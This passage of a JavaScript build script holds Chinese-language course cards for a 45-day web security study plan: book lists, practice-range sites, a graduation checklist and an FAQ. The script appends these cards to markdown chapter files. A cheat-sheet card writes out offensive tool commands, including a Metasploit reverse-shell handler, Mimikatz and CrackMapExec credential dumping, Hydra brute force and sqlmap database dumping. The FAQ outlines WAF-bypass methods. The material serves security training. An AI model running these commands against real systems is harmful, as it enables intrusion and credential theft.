    ['📚 必读书单 Top15 从入门到高阶','#0e7490',['【入门必看】①《Web安全深度剖析》②《白帽子讲Web安全》③《Web安全攻防: 渗透测试实战指南》','【CTF入门】④《CTF特训营》⑤《CTF竞赛权威指南》⑥《Web安全深度实践: 从0到1》','【代码审计】⑦《代码审计: 企业级Web代码安全架构》⑧《PHP安全之道》','【Java安全】⑨《Java Web安全代码审计与实战案例》⑩《深入理解Java虚拟机》','【内网/红队】⑪《内网安全攻防: 渗透测试实战指南》⑫《Metasploit权威指南》','【高阶/研究】⑬《漏洞战争: 软件漏洞分析精要》⑭《加密与解密》⑮《灰帽黑客》','💡 学习方法: 先读完第1/2/3本(3个月) → 做靶场 → 第4/5本CTF → 第11本内网 → 高阶书按需']],
    ['💻 学习资源站 收藏夹清单 12个','#7c2d12',['靶场: BUUCTF / NSSCTF / XCTF攻防世界 / Vulfocus / Vulhub / HackTheBox / TryHackMe','视频: B站 搜索 "Web安全 零基础" / FreeBuf学院 / i春秋 / 安全客学院','工具下载: Github / 52pojie / 吾爱破解 / Kali工具大全 / PenTestTools.cn','资讯文章: FreeBuf / 安全客 / 先知社区 / Paper Seebug / 嘶吼 / InfoQ安全','漏洞情报: CNVD / CNNVD / CVE Details / Exploit-DB / Packet Storm / Nuclei templates','面试题: 牛客网安全专区 / 安全面经 知乎 / GitHub Awesome-Security-Interview']],
    ['⚡ 坚持的力量: 给零基础小白的5句话','#166534',['① 没有天生的黑客 都是熬出来的: 第一天看不懂Burp没关系 第45天你已经会打Fastjson ✓','② 每天至少2小时靶场实操 + 1小时看书/文章: 理论+实战 双轮驱动 缺一不可 ✓','③ 遇到报错别跳过: Google/百度报错信息 80%的坑都能解决 剩下20% 记在笔记本里未来就懂了 ✓','④ 写博客/做笔记 是最好的学习: 45天结束后 你应该有45篇详细的靶场WriteUp 发在CSDN/知乎 未来面试就是你的作品集 ✓','⑤ 保持热爱保持好奇心: 安全圈每天都有新CVE新玩法 追不上没关系 打好基础 万变不离其宗 未来的你一定会感谢现在努力45天的自己 💯']],
    ['🏅 毕业颁发：靶场通关证书 虚拟章','#be123c',['🎓 学员ID: CISP-STUDENT-' + Date.now().toString().slice(-6) + ' 📅 毕业日期: ' + new Date().toLocaleDateString('zh-CN'),'📚 累计课时: 45天 × 平均每日3~6小时 = 135~270小时实战训练','🎯 通关靶场: DVWA 14模块全通 + SQLi-Labs 75关全通 + Upload-Labs 21关 + Pikachu全通 + Vulhub 20+靶机 + Java三大件/Weblogic等中高级漏洞','🏆 获得技能徽章: [Web入门银章] [SQL注入金章] [Java漏洞银章] [综合实战铜章] [内网渗透铜章]','🧭 最终评级: 【Web安全中级工程师】具备独立进行渗透测试项目/CTF比赛Web题解题/蓝队基础分析的能力']],
    ['🧭 3个月后复盘自查表 你要对照检验','#0f172a',['[ ] CTF比赛独立解题 ≥100 Web题','[ ] 发表靶场WriteUp ≥45篇 每篇不少于1000字+截图','[ ] Vulhub 通打 ≥60个漏洞 独立复现 不看官方WP','[ ] 拿到 CNVD/CNNVD 通用漏洞证书 ≥3个 0到1突破','[ ] 开始学习 Pwn 或 Crypto 至少一门非Web方向','[ ] 掌握至少一门编程语言 Python/Go/Java 能写简单工具脚本','[ ] 能讲清楚 至少10个CVE的成因/复现/修复 面试无压力','[ ] 进入 1~2 个高质量安全社群 和大佬交流 不再孤军奋战','[ ] 简历里有 至少1个 安全项目经验 可以写进去面试','[ ] 坚持每天做 当日复盘笔记 今日学3点/踩2坑/明日计划1']],
    ['🎉 毕业寄语: 安全之路 永无止境','#1e40af',['当你看到这一页 说明你已经完成了 45天 从零基础到Web安全中级 超酷的旅程 🎉','但这只是开始: 今天的CVE-2021-44228 明天就会变成 2025-XXXX 永远有新的漏洞等着你去发现','请记住: 学习安全最大的收获 不是拿到了多少证书 而是掌握了【发现问题→分析问题→解决问题】的底层思维能力','有了这种能力 无论你未来去做红队/蓝队/安全研究/云安全/AI安全 都能快速上手 一通百通','最后 愿你在网络安全的世界里 保持初心 保持热爱 合法合规 做白帽 守护这个真实又虚拟的世界 ❤️','👉 我们在 护网红队 / CTF领奖台 / CNVD漏洞榜 / 大厂安全岗 等你 再见！🎉🎉🎉']],
    ['📋 下一步立即执行清单 10件事','#0369a1',['① 立刻打开BUUCTF 注册账号 刷 2021-WEB方向的题 巩固所学 ✓','② 新建 个人博客/CSDN/知乎 开第一篇文章: 《Web安全45天学习总结》 ✓','③ 把你的靶场笔记整理成 GitBook 发布在 Github Pages 作为长期作品集 ✓','④ 关注 FreeBuf/安全客/先知社区 三个公众号 每天浏览10分钟 保持资讯敏感度 ✓','⑤ CISP证书报名 最近的一期班 尽早拿下入行敲门砖 ✓','⑥ 用 Python 写一个 自己的漏洞扫描器 结合Nuclei模板 调用API 练手自动化 ✓','⑦ 复盘第31/40/41/42/43章的 Java漏洞 每个至少再打2遍 滚瓜烂熟 ✓','⑧ 内网篇 MS17-010 / Zerologon / Mimikatz 实操一遍 可以用靶场本地搭 ✓','⑨ 加一个安全社群 找到3个同频学习的朋友 组学习小组 互相监督 ✓','⑩ 3个月后 回到 Day45 再次填写 复盘自查表 检验自己的成长 ✓ 加油！💪']],
    ['🎯 三大高频问题解答 FAQ','#92400e',['Q1: 我零基础 看完还不会写EXP怎么办？A: 很正常！先把每个EXP拿来 逐行加注释 理解每一行是干嘛的 → 然后改参数改payload → 最后自己手搓一个 从复制粘贴到原创 有3个月过渡期','Q2: 我能找到漏洞 但不会绕过WAF怎么办？A: 绕过WAF本质就是: 编码变形(URL×2/Unicode/Hex) + 拆分拼接(字符串) + 利用协议特性(HTTP2/0.9) + 特征碎片化 多练100个绕过案例就有感觉了','Q3: 入行安全 工资低怎么办？A: 安全是越老越吃香的行业 前2年先攒经验(证书+项目+漏洞榜) 3年跳大厂 25W+很正常 5年红队/研究员 40W起步 坚持3年 回报比开发高很多！']],
    ["📖 常用工具 cheat sheet 速查卡",'#7c3aed',['Nmap: nmap -sT -sV -Pn -T3 -p- -oA target 目标IP 全端口 服务识别 ✓','Sqlmap: sqlmap -u "url?id=1" --dbs --batch --random-agent 自动脱库 ✓','BurpSuite: Intruder 暴力破解 / Repeater 调包 / Scanner 扫描 ✓','MSFconsole: use exploit/multi/handler → set payload linux/x86/meterpreter/reverse_tcp → run ✓','Nuclei: nuclei -u https://target -t /nuclei-templates/cves/ -severity critical,high 批量高危 ✓','Hydra: hydra -l admin -P pass.txt ssh://target:22 SSH/FTP/HTTP 暴力破解 ✓','FRP: frps.ini vps + frpc.ini 靶机 → 配置端口映射 穿透内网 ✓','CrackMapExec: cme smb 192.168.1.0/24 -u user -p "P@ss" --sam C段批量抓Hash ✓','Mimikatz: privilege::debug sekurlsa::logonpasswords lsadump::sam 抓密码 ✓','Impacket: psexec.py/wmiexec.py/smbexec.py / secretsdump.py 内网横向全家桶 ✓']],
    ['✅ Day45 终极毕业自测 通关就是胜利！','#166534',['🧱 基础: 能讲清 OWASP Top10 每个类别的原理/例子/修复 ≥80分 ✓','💉 注入: SQL注入10种类型 手工+sqlmap 75关全部能独立复现 ≥90分 ✓','🔒 认证: 弱口令/JWT/会话/Cookie/CSRF 五种认证漏洞原理+实战 ≥85分 ✓','☕ Java: Fastjson/Shiro/Log4j2/Weblogic 四大Java高危 能讲清版本差异和加固 ≥90分 ✓','🧱 中间件: Nginx/Apache/Tomcat/IIS/JBoss 五种中间件 每个至少说2个CVE ≥80分 ✓','🛰️ 综合: Vulhub靶场 从信息收集→漏洞→提权→横向 独立完成 ≥85分 ✓','📝 报告: 写过完整的7章节渗透测试报告 包含复现截图和修复建议 ≥80分 ✓','🏆 最终平均分: ≥85分 你已经是 Web安全中级工程师 毕业！🎓🎉 低于85分 → 回Day1重刷第二遍 打好基础再冲下阶段 💪']],
  ],
};

// Append Runner for all chapters with SVG topics
(function runBatchAll() {
  const days = [31, 37, 38, 40, 41, 42, 43, 44, 45];
  for (const d of days) {
    const list = TOPICS[d];
    if (!list || list.length === 0) continue;
    const filePath = join(BASE_DIR, `day-${d}.md`);
    const existing = readFileSync(filePath, 'utf8');
    if (existing.includes('本章拓展图解汇总（day-' + d)) {
      console.log(`[SKIP] day-${d}.md already has SVG section`);
      continue;
    }
    const section = buildSection(`day-${d}`, list);
    appendFileSync(filePath, section, 'utf8');
    console.log(`[OK] day-${d}.md appended ${list.length} SVG cards`);
  }
  console.log('\n✅ 全部SVG补齐完成！准备验证 SVG 数量...');
})();
